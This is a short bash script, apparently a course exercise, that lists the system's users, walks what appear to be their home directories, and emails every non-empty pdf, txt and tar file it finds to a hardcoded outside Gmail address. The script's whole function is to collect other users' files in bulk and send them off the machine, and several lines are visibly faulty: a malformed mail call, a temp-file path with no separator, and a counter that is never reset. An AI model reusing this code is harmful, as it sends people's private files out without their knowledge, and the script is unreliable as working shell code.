# sends mail, using mail utility

#!/bin/bash

subject="Bil235"
cur_address="ayvirsin@gmail.com"
SEARCHFOR="pdf txt tar"

# generate temp file		
touch `pwd`"temp"
fl=`pwd`"temp"
echo `pwd | awk '{print $1}'`>$fl

changeDir(){				
# read file line by line
exec 0<$fl
	while read line
	do
	cd $line
	done

}
i=1

traverse(){
ls | while read directory
do
       
       if [ -d "$directory" ]; then
               
           cd "$directory"
               for f in *."$1" 
			do 
				if [ -s $f ] # if file exists and not null 
				then	
					echo $f
					mail -s, $subject, $cur_address < "$f" 	
				fi
			done
		traverse $@
               cd ..
               
       fi

done
}
	


for username in  `./Proc1` # call first c program for each user
	do
		for value in `./Proc2 $username`
		do
			if [ $i -eq 4 ]
			then
			
			for ext in $SEARCHFOR
			do	
				cd $value	
				traverse $ext
			done					
			fi
		i=`expr $i \+ 1` # increase i
		done
		
		changeDir	
	done
